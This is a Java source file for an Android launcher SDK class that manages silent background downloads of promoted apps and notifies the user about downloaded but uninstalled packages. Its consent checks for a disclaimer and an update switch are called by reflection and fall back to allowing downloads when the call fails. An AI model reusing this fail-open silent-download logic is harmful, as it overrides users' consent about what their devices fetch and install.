package cool.sdk.SAManager;


import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import android.content.Context;

import com.cooee.framework.config.defaultConfig.BaseDefaultConfig;
import com.cooee.framework.function.DynamicEntry.OperateDynamicClient;
import com.cooee.framework.function.DynamicEntry.OperateDynamicProxy;
import com.cooee.framework.utils.StringUtils;

import cool.sdk.DynamicEntry.DynamicEntryHelper;
import cool.sdk.download.manager.dl_info;


public class SAHelper extends SACoolDLMgr
{
	
	public static String WIFISA_INSTALL_STATE = "wifiSA_Install_State";
	public static int WIFISA_INSTALL = 1;
	public static int WIFISA_UNSTALL = 2;
	
	protected SAHelper(
			Context context )
	{
		super( context );
		// TODO Auto-generated constructor stub
	}
	
	static SAHelper instance = null;
	
	public static SAHelper getInstance(
			Context context )
	{
		synchronized( SAHelper.class )
		{
			if( instance == null )
			{
				instance = new SAHelper( context );
			}
		}
		return instance;
	}
	
	//public static String smart_download = "smart_download";
	public boolean allowSilentDownload()
	{
		if( !allowUpdate( context ) )
		{
			return false;
		}
		if( !allowDynamicUpdate() )
		{
			return false;
		}
		//		SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences( context );
		//		boolean dynamicShare = sharedPreferences.getBoolean( smart_download , true );
		//		if( !dynamicShare )
		//		{
		//			return false;
		//		}
		if( DynamicEntryHelper.getInstance( context ).allowSilentDownload() )
		{
			return true;
		}
		if( CategoryallowSilentDownload() )
		{
			return true;
		}
		return false;
	}
	
	public String getOperateVersion()
	{
		String listVersion = StringUtils.concat( DynamicEntryHelper.getInstance( context ).getListVersion() , getCategoryVersion() );
		if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
			Log.v( "SA" , StringUtils.concat( "getOperateVersion:" , listVersion ) );
		return listVersion;
	}
	
	public Set<DownloadItem> getSilentDownloadList()
	{
		Set<DownloadItem> items = DynamicEntryHelper.getInstance( context ).getSilentDownloadList();
		Set<DownloadItem> items2 = getCategorySilentDownloadList();
		if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
			Log.v( "SA" , StringUtils.concat( "getSilentDownloadList - items.size:" , items.size() , "-items2.size:" , items2.size() ) );
		for( DownloadItem item : items2 )
		{
			items.add( item );
		}
		return items;
	}
	
	@Override
	protected void showNotify(
			NotifyType type )
	{
		// TODO Auto-generated method stub
		switch( type )
		{
			case T1://未下载完所有
				break;
			case T2://下载完所有
				break;
			case T3://T2没有点击，3天后显示
				break;
			case OpChange://运营周期改变
				break;
			default:
				break;
		}
		if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
			Log.v( "SA" , StringUtils.concat( "showNotify: type-" , type , "-OperateDynamicProxy.context=" + OperateDynamicProxy.context ) );
		OperateDynamicClient client = OperateDynamicProxy.getInstance().getOperateDynamicClient();
		List<dl_info> dl_info_list = getSuccessButNotInstallList();
		client.showWifiDownloadNotify( type , dl_info_list );
		//wifi1118 end
	}
	
	public static boolean allowUpdate(
			Context context )
	{
		boolean isEnableUpdate = false;
		try
		{
			Class<?> cls = Class.forName( "com.iLoong.launcher.desktop.Disclaimer" );
			Method method = cls.getMethod( "enableDisclaimer" );
			isEnableUpdate = (Boolean)method.invoke( cls );
		}
		catch( Throwable t )
		{
			t.getStackTrace();
			isEnableUpdate = true;
		}
		return isEnableUpdate;
	}
	
	public static boolean allowDynamicUpdate()
	{
		boolean isEnableUpdate = false;
		try
		{
			Class<?> cls = Class.forName( "com.cooee.framework.function.DynamicEntry.DLManager.WifiSAHandle" );
			Method method = cls.getMethod( "allowSADownload" );
			isEnableUpdate = (Boolean)method.invoke( cls );
		}
		catch( Throwable t )
		{
			t.getStackTrace();
			isEnableUpdate = true;
		}
		return isEnableUpdate;
	}
	
	public boolean CategoryallowSilentDownload()
	{
		try
		{
			Class<?> classCategoryHelper = Class.forName( "cool.sdk.Category.CategoryHelper" );
			Class<?> classCategoryUpdate = Class.forName( "cool.sdk.Category.CategoryUpdate" );
			Method getInstance = classCategoryHelper.getDeclaredMethod( "getInstance" , Context.class );
			getInstance.setAccessible( true );
			Object instanceCategoryHelper = getInstance.invoke( null , context );
			Method allowSilentDownload = classCategoryUpdate.getDeclaredMethod( "allowSilentDownload" );
			allowSilentDownload.setAccessible( true );
			Boolean allow = (Boolean)allowSilentDownload.invoke( instanceCategoryHelper );
			if( allow )
			{
				return true;
			}
		}
		catch( Exception e )
		{
			// TODO: handle exception
		}
		return false;
	}
	
	public String getCategoryVersion()
	{
		String listVersion;
		try
		{
			Class<?> classCategoryHelper = Class.forName( "cool.sdk.Category.CategoryHelper" );
			Class<?> classCategoryUpdate = Class.forName( "cool.sdk.Category.CategoryUpdate" );
			Method getInstance = classCategoryHelper.getDeclaredMethod( "getInstance" , Context.class );
			getInstance.setAccessible( true );
			Object instanceCategoryHelper = getInstance.invoke( null , context );
			Method getListVersion = classCategoryUpdate.getDeclaredMethod( "getListVersion" );
			getListVersion.setAccessible( true );
			listVersion = (String)getListVersion.invoke( instanceCategoryHelper );
			if( !DEFAULT_VERSION.equals( listVersion ) )
			{
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "SA" , StringUtils.concat( "getOperateVersion - listVersion:" , listVersion , "-DEFAULT_VERSION:" , DEFAULT_VERSION ) );
				return listVersion;
			}
		}
		catch( Exception e )
		{
			// TODO: handle exception
		}
		return DEFAULT_VERSION;
	}
	
	public Set<DownloadItem> getCategorySilentDownloadList()
	{
		try
		{
			Class<?> classCategoryHelper = Class.forName( "cool.sdk.Category.CategoryHelper" );
			Class<?> classCategoryUpdate = Class.forName( "cool.sdk.Category.CategoryUpdate" );
			Method getInstance = classCategoryHelper.getDeclaredMethod( "getInstance" , Context.class );
			getInstance.setAccessible( true );
			Object instanceCategoryHelper = getInstance.invoke( null , context );
			Method getSilentDownloadList = classCategoryUpdate.getDeclaredMethod( "getSilentDownloadList" );
			getSilentDownloadList.setAccessible( true );
			Set<DownloadItem> items2 = (Set<DownloadItem>)getSilentDownloadList.invoke( instanceCategoryHelper );
			return items2;
		}
		catch( Exception e )
		{
			// TODO: handle exception
			return new HashSet<DownloadItem>();
		}
	}
}
